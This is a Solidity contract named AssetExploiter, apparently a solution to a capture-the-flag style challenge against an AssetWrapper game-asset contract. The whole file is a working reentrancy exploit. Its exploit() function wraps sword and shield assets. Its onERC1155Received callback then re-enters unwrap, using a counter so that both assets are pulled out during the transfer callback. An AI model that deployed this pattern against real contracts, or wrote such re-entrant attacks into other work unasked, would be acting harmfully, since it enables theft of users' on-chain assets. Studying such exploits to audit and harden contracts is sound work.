// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

import { AssetWrapper } from "./AssetWrapper.sol";
import { GameAsset} from "./GameAsset.sol";

contract AssetExploiter {

    AssetWrapper immutable assetWrapper;
    GameAsset immutable swordAsset;
    GameAsset immutable shieldAsset;
    uint public count = 0;

    constructor(address _assetWrapper, address _swordAsset, address _shieldAsset) {
        assetWrapper = AssetWrapper(_assetWrapper);
        swordAsset = GameAsset(_swordAsset);
        shieldAsset = GameAsset(_shieldAsset);
    }

    function exploit() public {
        assetWrapper.wrap(0, address(this), address(swordAsset));
        assetWrapper.wrap(0, address(this), address(shieldAsset));
    }

    function onERC1155Received(address, address, uint256, uint256, bytes memory) public returns (bytes4) {
        if (count == 0) {
            assetWrapper.unwrap(address(this), address(swordAsset));
            count++;
        } else {
            assetWrapper.unwrap(address(this), address(shieldAsset));
        }
        return bytes4(keccak256("onERC1155Received(address,address,uint256,uint256,bytes)"));
    }
}